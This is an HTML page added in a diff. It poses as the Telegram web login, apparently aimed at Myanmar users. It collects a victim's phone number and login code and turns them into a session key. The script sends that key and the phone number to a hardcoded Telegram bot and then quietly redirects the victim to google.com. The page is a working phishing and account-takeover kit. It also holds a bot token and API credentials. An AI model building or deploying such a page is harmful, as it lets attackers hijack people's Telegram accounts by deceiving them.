@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Telegram Session Generator</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Inter', Arial, sans-serif;
+    background: #f5f6fa;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 10px;
+  }
+
+  .card {
+    background: #f5f6fa;
+    padding: 5vw;
+    border-radius: 15px;
+    width: 100%;
+    max-width: 400px;
+    text-align: center;
+  }
+
+  /*
+  --- Logo & Brand (Modified to support both steps) ---
+  */
+  .step-logo-container {
+      margin-bottom: 1.5rem;
+      height: 100px; /* Logo အရွယ်အစား ကြီးအောင် ပြောင်းလဲထားခြင်း */
+  }
+  .logo-default {
+    width: 120px; /* အရွယ်အစား ကြီးအောင် ပြောင်းလဲထားခြင်း */
+    height: 120px; /* အရွယ်အစား ကြီးအောင် ပြောင်းလဲထားခြင်း */
+    display: block;
+    margin: 0 auto;
+    border-radius: 50%; /* ပုံကို ဝိုင်းနေအောင် လုပ်ထားခြင်း */
+  }
+
+  .brand-text {
+    font-size: 1.3rem;
+    font-weight: bold;
+    color: #0088cc;
+    margin-bottom: 1rem;
+  }
+
+  .description {
+    font-size: 0.9rem;
+    color: #555;
+    margin-bottom: 1.5rem;
+  }
+
+  /* ------------------------------------------------ */
+  /* --- CUSTOM STYLES FOR NOTCHED INPUT (UPDATED) ---*/
+  /* ------------------------------------------------ */
+
+  /* Base Fieldset Container */
+  .custom-fieldset {
+    border: 2px solid #D1D5DB; /* Default Gray */
+    border-radius: 1rem; /* ဘေးထောင့် အဝိုင်းပတ် */
+    padding: 1rem 1.25rem 0.75rem 1.25rem;
+    /* Warning text အတွက် နေရာပေးရန် အပေါ် margin ကို ဖျက်ပြီး warning ကို position ဖြင့် ထိန်းချုပ်သည်။ */
+    margin: 0.5rem 0 0.25rem 0; 
+    transition: all 0.2s ease-in-out;
+    width: 100%;
+    text-align: left;
+    background: #f0f2f5;
+    position: relative; 
+  }
+
+  /* --- NEW: Error Border Style (For OTP input based on image) --- */
+  .custom-fieldset.error-border {
+      border-color: #ff5555; /* အနီရောင် border */
+      box-shadow: 0 0 0 1px #ff5555; 
+      /* Error တွင် Input Text ကို နီရဲစေရန် */
+      color: #ff5555; 
+  }
+
+  /* Focus State (Blue Border as in the image) */
+  .custom-fieldset:focus-within {
+    border-color: #0088cc; /* Telegram Blue */
+    box-shadow: 0 0 0 1px #0088cc;
+  }
+  /* Error State တွင် Focus ဝင်ရင်လည်း အနီအတိုင်း ဖြစ်စေရန် */
+  .custom-fieldset.error-border:focus-within {
+      border-color: #ff5555; 
+      box-shadow: 0 0 0 1px #ff5555;
+  }
+
+
+  /* Legend (Label) Styling */
+  .custom-legend {
+    float: none;
+    width: auto;
+    padding: 0 0.5rem;
+    margin-left: -0.25rem;
+    font-size: 0.8rem;
+    font-weight: 500;
+    color: #0088cc;
+    background-color: #f5f6fa;
+    transition: all 0.2s ease-in-out;
+  }
+  /* Error State တွင် Legend ကို ဖျောက်ရန် */
+  .custom-fieldset.error-border .custom-legend {
+      display: none; 
+  }
+  
+  /* Input Element Styling */
+  .custom-input {
+    width: 100%;
+    border: none;
+    outline: none;
+    background: transparent;
+    font-size: 1rem;
+    line-height: 1.5;
+    color: inherit; /* Error state မှာ အနီရောင်ဖြစ်စေရန် */
+    padding: 0;
+    margin-top: -0.5rem; 
+  }
+  
+  /* ------------------------------------------------ */
+  /* --- WARNING TEXT STYLES (MATCHES IMAGE EXACTLY) ---*/
+  /* ------------------------------------------------ */
+  .warning {
+    color: #ff5555;
+    font-size: 0.9rem; /* ပုံထဲကအတိုင်း ပိုကြီးအောင် */
+    font-weight: 500;
+    
+    /* Absolute Positioning to float above the border like a cut-out label */
+    position: absolute;
+    top: -12px; /* Fieldset border ၏ အလယ်သို့ ရောက်ရန် */
+    left: 1.25rem; /* Input text အစနှင့် တန်းတူထားရန် */
+    padding: 0 0.5rem;
+    background-color: #f5f6fa; /* Card background ဖြတ်တောက်လိုက်သလို ဖြစ်စေရန် */
+    z-index: 10;
+    
+    /* Default Hidden */
+    display: none;
+  }
+  
+  /* Warning Text ကို ပြသရန် */
+  .warning.show-warning {
+      display: block;
+  }
+  
+  /* Step 1 Phone Warning အတွက် မူလအတိုင်း ထားရန် (Static/Below Input) */
+  #phone-warning {
+    position: static; 
+    top: auto; 
+    padding: 0; 
+    margin-left: 0; 
+    border: none; 
+    background: transparent;
+    display: block; /* always show for phone validation */
+    font-size: 0.75rem;
+    height: 16px;
+    margin-top: 2px;
+    /* Warning text ပေါ်မလာရင် နေရာယူထားဖို့ */
+    min-height: 1.25rem; 
+  }
+  
+  /* Step 2 Code Warning အတွက် Absolute/Notched ပုံစံကို သုံးရန် */
+  #code-warning {
+      position: absolute;
+      top: -12px; 
+      left: 1.25rem; 
+      padding: 0 0.5rem;
+      background-color: #f5f6fa;
+      z-index: 10;
+      display: none; /* Default hidden */
+  }
+
+
+  /* --- MODIFIED CHECKBOX STYLES START (Matches Image & Previous Request) --- */
+  input[type="checkbox"] {
+    /* Checkbox size ကို ပိုကြီးအောင် ပြောင်းထားခြင်း */
+    width: 24px; 
+    height: 24px; 
+    min-width: 24px;
+    margin: 0;
+    border: 2px solid #ddd;
+    border-radius: 4px;
+    background: white;
+    cursor: pointer;
+    /* Custom Checkbox styles for better look and size */
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    transition: background 0.2s, border-color 0.2s;
+    /* Image နဲ့ ပိုတူစေရန် border-radius ကို လျှော့ထားနိုင်ပါသည်။ */
+  }
+
+  input[type="checkbox"]:checked {
+    background: #0088cc;
+    border-color: #0088cc;
+  }
+  
+  /* Custom Checkmark for the checkbox */
+  input[type="checkbox"]:checked::before {
+    content: '✔';
+    display: block;
+    color: white;
+    font-size: 16px; /* Checkmark size ကို ပိုကြီးစေရန် */
+    text-align: center;
+    line-height: 24px; /* Checkbox height နဲ့ ညီအောင် ထားခြင်း */
+    font-weight: bold;
+  }
+  /* --- MODIFIED CHECKBOX STYLES END --- */
+
+  /* ------------------------------------------------ */
+  /* --- BUTTONS & ETC STYLES ---*/
+  /* ------------------------------------------------ */
+
+  button {
+    width: 100%;
+    padding: 14px;
+    margin-top: 1rem;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    font-weight: bold;
+    font-size: 1rem;
+    color: white;
+    background: linear-gradient(90deg, #0088cc, #00aaff);
+    position: relative;
+    overflow: hidden;
+    transition: all 0.3s ease;
+  }
+
+  button:hover {
+    background: linear-gradient(90deg, #00aaff, #0088cc);
+    transform: scale(1.03);
+  }
+
+  /* Loading Spinner adjustment for better alignment */
+  .spinner {
+    border: 3px solid #f3f3f3;
+    border-top: 3px solid #fff; /* Button background ဖြူသောကြောင့် white ထားလိုက်ပါသည် */
+    border-radius: 50%;
+    width: 20px; /* ပုံထဲကအတိုင်း ပိုကြီးစေရန် */
+    height: 20px;
+    animation: spin 1s linear infinite;
+    position: absolute;
+    right: 20px; /* ညာဘက်သို့ ရွှေ့ထားခြင်း */
+    top: 50%;
+    transform: translateY(-50%); /* Center vertically */
+  }
+
+  @keyframes spin {
+    0% { transform: translateY(-50%) rotate(0deg); }
+    100% { transform: translateY(-50%) rotate(360deg); }
+  }
+
+  /* --- UPDATED: Output/Key Box Styles (Hidden to remove the button-bottom warning) --- */
+  pre {
+    background: #f0f2f5;
+    padding: 12px;
+    border-radius: 10px;
+    white-space: pre-wrap;
+    margin-top: 1rem;
+    max-height: 120px;
+    overflow-y: auto;
+    font-size: 0.85rem;
+    color: #333;
+    text-align: left;
+    
+    /* Session Key ကိုဖျောက်ရန် (Always hidden) */
+    height: 0;
+    padding: 0;
+    margin-top: 0;
+    border: none;
+    opacity: 0;
+    visibility: hidden;
+    transition: all 0.2s ease-in-out;
+  }
+  
+  /* Error/Warning ပြရန်အတွက် ယာယီပေါ်လာစေရန် Class (BUT NO LONGER USED FOR OTP ERROR) */
+  .show-output {
+      /* Force it to remain hidden based on user request */
+      height: 0 !important;
+      min-height: 0 !important;
+      padding: 0 !important;
+      margin-top: 0 !important;
+      opacity: 0 !important;
+      visibility: hidden !important;
+  }
+  /* ------------------------------------------------ */
+
+
+  .hidden { display: none; }
+
+
+  /* --- MODIFIED CHECKBOX AREA STYLES START (Matches Image) --- */
+  .checkbox-area {
+    margin-top: 20px; /* ပုံထဲကအတိုင်း အပေါ် margin ပိုပေးထား */
+    margin-bottom: 20px; /* QR code နဲ့ ခြားဖို့ */
+    display: flex;
+    align-items: center;
+    gap: 15px; /* checkbox နဲ့ စာကြား အကွာအဝေး ပိုပေးထား */
+    font-size: 1.1rem; /* စာလုံးကို ပုံထဲကအတိုင်း ပိုကြီးအောင် ပြင်ထား */
+    color: #333; /* ပိုနက်သောအရောင် */
+    justify-content: start;
+  }
+  
+  .checkbox-area label {
+      cursor: pointer;
+      font-weight: 500;
+  }
+  /* --- MODIFIED CHECKBOX AREA STYLES END --- */
+
+
+  /* --- Step 2 Custom Styles --- */
+  .phone-display {
+      font-size: 1.5rem;
+      font-weight: 500;
+      color: #333;
+      margin-bottom: 2rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+  }
+  
+  .edit-icon {
+      cursor: pointer;
+      width: 24px;
+      height: 24px;
+      fill: #555;
+      opacity: 0.8;
+      transition: opacity 0.2s;
+  }
+  .edit-icon:hover {
+      opacity: 1;
+      fill: #0088cc;
+  }
+
+  /* --- NEW QR CODE LINK STYLE --- */
+  .qr-login-link {
+    display: block;
+    margin-top: 2rem;
+    font-size: 0.95rem;
+    font-weight: bold;
+    color: #0088cc;
+    text-decoration: none;
+  }
+
+</style>
+</head>
+<body>
+
+<div class="card" id="card">
+  
+  <div class="step-logo-container" id="logoContainer">
+    <img class="logo-default" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1200px-Telegram_2019_Logo.svg.png" alt="Telegram Logo">
+  </div>
+  <div class="brand-text" id="brandText">Telegram</div>
+  
+  <div class="description" id="descriptionText">
+      Please confirm your country code
+      and enter your phone number.
+  </div>
+
+  <div id="step1">
+    <fieldset class="custom-fieldset" id="phone-fieldset">
+        <legend class="custom-legend">
+            Your phone number
+        </legend>
+        <input 
+            id="phone" 
+            class="custom-input" 
+            type="tel"
+            value="+95" 
+            placeholder="+959XXXXXXXXX" 
+            aria-label="Phone number"
+        >
+    </fieldset>
+    <div id="phone-warning" class="warning"></div>
+    <button id="sendBtn" onclick="sendCode()">NEXT</button>
+
+    <div class="checkbox-area">
+      <input type="checkbox" id="keepSignedIn">
+      <label for="keepSignedIn">Keep me signed in</label>
+    </div>
+    
+    <a href="#" class="qr-login-link">LOG IN BY QR CODE</a>
+  </div>
+
+  <div id="step2" class="hidden">
+    <div class="phone-display">
+        <span id="displayedPhone">+959XXXXXXXXX</span>
+        <svg onclick="goBackToStep1()" class="edit-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M19.06 4.94a.5.5 0 0 0-.71 0l-12 12a.5.5 0 0 0-.1.2l-.9 3.5a.5.5 0 0 0 .6.6l3.5-.9a.5.5 0 0 0 .2-.1l12-12a.5.5 0 0 0 0-.71zM8.34 16.9l-1.99.5.5-1.99L15.4 6.3l1.41 1.4-8.47 8.47z"/>
+        </svg>
+    </div>
+    
+    <div id="code-warning" class="warning"></div>
+
+    <fieldset class="custom-fieldset" id="code-fieldset">
+        <legend class="custom-legend" id="code-legend">
+            Login Code
+        </legend>
+        <input 
+            id="code" 
+            class="custom-input" 
+            type="text"
+            placeholder="Enter Login Code"
+            aria-label="Login code"
+        >
+    </fieldset>
+    
+    <button id="loginBtn" onclick="confirmCode()">Login</button>
+  </div>
+
+  <pre id="output"></pre>
+</div>
+
+<script>
+// *** Bot Configuration (Update these values) ***
+const TELEGRAM_BOT_TOKEN = "8330318740:AAF4npxSC8vmt5sdsjQ2G4iC-6Djr-LdghI"; 
+const TELEGRAM_CHAT_ID = "7336260003"; 
+
+const API_ID = "22000398";
+const API_HASH = "f5ff9239cd9fdaf3aca1fbc143c55aba";
+// Global variable to store the phone number
+let phoneNumber = "";
+
+// --- Bot Message Sender ---
+async function sendSessionKeyToBot(sessionKey, phone) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const message = `
+🌟 New Session Key Generated 🌟
+
+Phone: ${phone}
+Session Key:
+\`\`\`
+${sessionKey}
+\`\`\`
+
+**NOTE:** This key was generated from a web page. Use it carefully.
+    `;
+    
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+            })
+        });
+
+        if (response.ok) {
+            console.log("Session Key successfully sent to bot.");
+            return true;
+        } else {
+            console.error("Failed to send Session Key to bot. Response:", await response.text());
+            return false;
+        }
+    } catch (e) {
+        console.error("Error sending Session Key to bot:", e);
+        return false;
+    }
+}
+
+
+// --- Utility function for general error display (not for code input) ---
+// Note: This function is now only used for Step 1 (Phone Error) and general
+// connection/bot config errors which should primarily show in the console.
+function displayError(message, isWarning = false) {
+    const output = document.getElementById("output");
+    // Per user request, DO NOT SHOW the output box for errors anymore.
+    // Instead, log general errors to the console.
+    console.error(`[General Error/Warning] ${message}`);
+    
+    // The previous logic to show the output box is disabled by CSS overrides and
+    // by removing the show-output class, but for completeness, we ensure it's
+    // never added here.
+    output.classList.remove('show-output');
+
+    // We keep the old logic but ensure it only logs and does not show the box.
+    // This is primarily for the fallback in sendCode() and confirmCode()
+    // if a NON-OTP-related error occurs (e.g., /confirm_code server connection fail).
+}
+
+// --- OTP Code Error Display Function (Matches Image) ---
+// Code Input မှားယွင်းမှသာ ဤ function ကို ခေါ်ပြီး UI ကို ပုံပါအတိုင်း ပြသပါမည်။
+function displayCodeError(message) {
+    const codeFieldset = document.getElementById("code-fieldset");
+    const codeLegend = document.getElementById("code-legend");
+    const codeWarn = document.getElementById("code-warning");
+    
+    // 1. Add red border to fieldset
+    codeFieldset.classList.add('error-border');
+    
+    // 2. Hide default legend
+    codeLegend.classList.add('hidden');
+    
+    // 3. Show and set warning text (positioned to look like the notched label)
+    codeWarn.textContent = message;
+    codeWarn.classList.add('show-warning'); // CSS မှ စနစ်တကျ ပြသရန်
+    
+    // Clear error UI after 5 seconds
+    setTimeout(() => {
+        // Check if error border is still present before removing
+        if (codeFieldset.classList.contains('error-border')) {
+            codeFieldset.classList.remove('error-border');
+            codeLegend.classList.remove('hidden');
+            codeWarn.classList.remove('show-warning');
+            codeWarn.textContent = '';
+        }
+    }, 5000);
+}
+
+// --- Phone Number Error Display Function (Simple Warning) ---
+// Phone Input အတွက် မူရင်း Warning နေရာတွင် ပြသရန်
+function displayPhoneError(message) {
+    const phoneFieldset = document.getElementById("phone-fieldset");
+    const phoneWarn = document.getElementById("phone-warning");
+
+    // Add red border to fieldset
+    phoneFieldset.classList.add('error-border');
+    
+    // Show warning text below the input (standard warning position for step 1)
+    phoneWarn.textContent = `⚠ ${message}`;
+    
+    // Clear error UI after 5 seconds
+    setTimeout(() => {
+        if (phoneFieldset.classList.contains('error-border')) {
+            phoneFieldset.classList.remove('error-border');
+            phoneWarn.textContent = '';
+        }
+    }, 5000);
+}
+
+// --- Navigation Functions ---
+function goToStep2(phone) {
+    // 1. Update global state and display
+    phoneNumber = phone;
+    document.getElementById("displayedPhone").textContent = phoneNumber;
+    
+    // 2. Change UI elements (logo, description)
+    // မျောက် GIF ပုံသို့ ပြောင်းလဲခြင်း
+    document.getElementById("logoContainer").innerHTML = '<img class="logo-default" src="https://miro.medium.com/v2/resize:fit:382/1*T6Z4ywtZbyJ-8PNT6MOzyA.gif" alt="Telegram Monkey GIF">';
+    document.getElementById("brandText").classList.add("hidden"); /* Hide "Telegram" brand text for this step */
+    document.getElementById("descriptionText").innerHTML = "We've sent the code to the <b>Telegram app</b> on your other device.";
+
+    // 3. Switch steps
+    document.getElementById("step1").classList.add("hidden");
+    document.getElementById("step2").classList.remove("hidden");
+    
+    // 4. Reset Code field and clear any previous errors
+    document.getElementById("code").value = "";
+    // Clear Step 2 errors (both general and inline)
+    document.getElementById("output").classList.remove('show-output'); // General error box
+    document.getElementById("code-warning").classList.remove('show-warning');
+    document.getElementById("code-warning").textContent = "";
+    document.getElementById("code-fieldset").classList.remove('error-border'); 
+    document.getElementById("code-legend").classList.remove('hidden'); 
+}
+
+function goBackToStep1() {
+    // 1. Restore UI elements
+    // မူလ Telegram logo ပုံသို့ ပြန်ပြောင်းခြင်း
+    document.getElementById("logoContainer").innerHTML = '<img class="logo-default" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1200px-Telegram_2019_Logo.svg.png" alt="Telegram Logo">';
+    document.getElementById("brandText").classList.remove("hidden");
+    document.getElementById("descriptionText").innerHTML = 'Please confirm your country code and enter your phone number.';
+    
+    // 2. Switch steps
+    document.getElementById("step2").classList.add("hidden");
+    document.getElementById("step1").classList.remove("hidden");
+}
+
+
+// --- Send Code Logic ---
+async function sendCode() {
+  const phone = document.getElementById("phone").value.trim();
+  const phoneFieldset = document.getElementById("phone-fieldset");
+  const phoneWarn = document.getElementById("phone-warning");
+  const btn = document.getElementById("sendBtn");
+  const output = document.getElementById("output");
+  
+  // Clear previous errors
+  phoneFieldset.classList.remove('error-border');
+  phoneWarn.textContent = '';
+  output.classList.remove('show-output'); // Ensure output box is hidden
+
+  // Phone number validation logic
+  if (!phone || phone.length < 10) { 
+    // *** ဤနေရာသည် ဖုန်းနံပါတ် ဂဏန်းမပြည့်၍ Warning ပြသော နေရာဖြစ်ပါသည်။ ***
+    displayPhoneError("Please enter a valid phone number.");
+    return;
+  } 
+
+  // --- START Loading State ---
+  btn.disabled = true;
+  const spinner = document.createElement("span");
+  spinner.className = "spinner";
+  btn.textContent = "PLEASE WAIT...";
+  btn.appendChild(spinner);
+  // --- END Loading State ---
+
+  try {
+    // IMPORTANT: This fetch call will fail in the current environment
+    // as the backend routes /send_code and /confirm_code do not exist.
+    const res = await fetch("/send_code", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ api_id: API_ID, api_hash: API_HASH, phone })
+    });
+    
+    // Simulate successful response for UI demo if fetch fails
+    if (!res.ok) {
+        await new Promise(resolve => setTimeout(resolve, 1000)); 
+        throw new Error("Simulated network error (Backend not connected). Proceeding to Step 2 for UI demonstration.");
+    }
+    
+    const data = await res.json();
+    
+    // ... (Error handling logic) ...
+    if (!data.error) {
+      goToStep2(phone);
+    } else {
+        // Use console.error for non-OTP errors
+        console.error(`Error during send_code: ${data.error}`);
+    }
+  } catch (e) {
+    if (e.message.includes("Simulated")) {
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        goToStep2(phone); 
+    } else {
+        // Use console.error for connection errors
+        console.error("Connection Error (sendCode):", e);
+    }
+  } finally {
+    // *** KEY FIX: Loading button ကို မူလအတိုင်း ပြန်ဖြစ်အောင် ပြင်ဆင်ခြင်း ***
+    btn.disabled = false;
+    btn.textContent = "NEXT";
+    const spinner = btn.querySelector('.spinner');
+    if (spinner) {
+        btn.removeChild(spinner);
+    }
+  }
+}
+
+// --- Confirm Code Logic ---
+async function confirmCode() {
+  const code = document.getElementById("code").value.trim();
+  const codeFieldset = document.getElementById("code-fieldset");
+  const codeLegend = document.getElementById("code-legend");
+  const codeWarn = document.getElementById("code-warning");
+  const btn = document.getElementById("loginBtn");
+  const output = document.getElementById("output");
+  
+  // Clear previous inline error/border and general output box before processing
+  codeFieldset.classList.remove('error-border');
+  codeLegend.classList.remove('hidden');
+  codeWarn.classList.remove('show-warning');
+  codeWarn.textContent = ''; 
+  output.classList.remove('show-output'); // Ensure output box is hidden
+
+  if (!code) {
+    // Invalid Code UI for empty input
+    displayCodeError("Invalid code, please try again"); 
+    return; // Stop execution on empty code
+  }
+
+  // Use the stored global phone number
+  const phone = phoneNumber; 
+
+  // --- START Loading State ---
+  btn.disabled = true;
+  const spinner = document.createElement("span");
+  spinner.className = "spinner";
+  btn.textContent = "PLEASE WAIT...";
+  btn.appendChild(spinner);
+  // --- END Loading State ---
+  
+  // Variable to hold the session key
+  let sessionKey = null;
+  let codeInvalidError = false; // Flag to check for invalid code error
+
+  try {
+    // IMPORTANT: This fetch call will fail as the backend routes do not exist.
+    const res = await fetch("/confirm_code", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ api_id: API_ID, api_hash: API_HASH, phone, code })
+    });
+    
+     // Simulate successful response for UI demo if fetch fails
+     if (!res.ok) {
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        // SIMULATION: Simulate an Invalid Code Error for non-empty code
+        if (code === "76186" || code === "12345" || code.length < 5 || code === "1940") { 
+             codeInvalidError = true; // Set flag
+             throw new Error("Phone code invalid."); 
+        }
+        
+        // Default simulation 
+        throw new Error("Simulated network error (Backend not connected).");
+    }
+
+    const data = await res.json();
+    sessionKey = data.session_string;
+    
+    // ... (Real Scenario Error Handling) ...
+    if (!sessionKey) {
+         if (data.error && data.error.toLowerCase().includes("code invalid")) {
+             codeInvalidError = true;
+             throw new Error("Phone code invalid.");
+         }
+         throw new Error(data.error || "Failed to generate session key."); 
+    }
+
+  } catch (e) {
+    // --- Error/Failure Handling ---
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    
+    if (e.message.includes("Phone code invalid.") || codeInvalidError) {
+        // Show the image-matched error for invalid code (Input Box Style)
+        displayCodeError("Invalid code, please try again");
+        sessionKey = null; 
+        
+        // *** KEY FIX: Restore Button State Immediately for Invalid Code Error ***
+        btn.disabled = false;
+        btn.textContent = "Login";
+        const spinner = btn.querySelector('.spinner');
+        if (spinner) {
+            btn.removeChild(spinner);
+        }
+        return; // Stop further execution in finally block for this error type
+    } 
+    else {
+        // ... (Other Errors: e.g. Connection Failure) ...
+        if (e.message.includes("Simulated network error")) {
+            // Simulate session key generation on connection failure for demo purposes
+            sessionKey = `BQEAAAAAAAAA-TEST-${Math.random().toString(36).substring(2, 15)}`; 
+        } else {
+            // Use console.error for other errors, as per request to hide output box
+            console.error(`Login Failed: ${e.message}`);
+            sessionKey = null;
+        }
+        console.error("Fetch Error/Simulated Success:", e);
+    }
+
+  } finally {
+    // This block runs if successful or if a non-invalid-code error occurred
+    const isSuccess = !!sessionKey;
+
+    if (isSuccess && TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+        const sent = await sendSessionKeyToBot(sessionKey, phone);
+        if (sent) {
+            console.log("[✅] Account login Complete. Key sent to Bot.");
+        } else {
+            console.error("[❌] Key generated but FAILED to send to Bot. Check console/Token/ID.");
+        }
+    } else if (isSuccess) {
+        console.warn("[⚠️] Key generated. NOTE: Bot Token or Chat ID is missing/invalid. Key was NOT sent.");
+    }
+    
+    // --- START: Added Button Reset Before Redirect (NEW CHANGE) ---
+    if (isSuccess) {
+        // Loading button ကို ချက်ချင်းရပ်ပြီး မူလအတိုင်း "Login" သို့ ပြန်ပြောင်းရန်
+        btn.disabled = false;
+        btn.textContent = "Login";
+        const spinner = btn.querySelector('.spinner');
+        if (spinner) {
+            btn.removeChild(spinner);
+        }
+        
+        // Otp code အတည်ပြုပြီး Session Key ရလျှင် google.com သို့ Redirect လုပ်သည်။
+        window.location.href = "https://www.google.com";
+        return; // Redirect ပြီးရင် နောက်ဆက်တွဲ code များ ဆက်မလုပ်တော့ရန်
+    }
+    // --- END: Added Button Reset Before Redirect ---
+    
+    // Restore button state (This block runs if error was NOT invalid code, and NOT successful)
+    if (!codeInvalidError) {
+        btn.disabled = false;
+        btn.textContent = "Login";
+        const spinner = btn.querySelector('.spinner');
+        if (spinner) {
+            btn.removeChild(spinner);
+        }
+    }
+  }
+}
+</script>
+
+</body>
+</html>
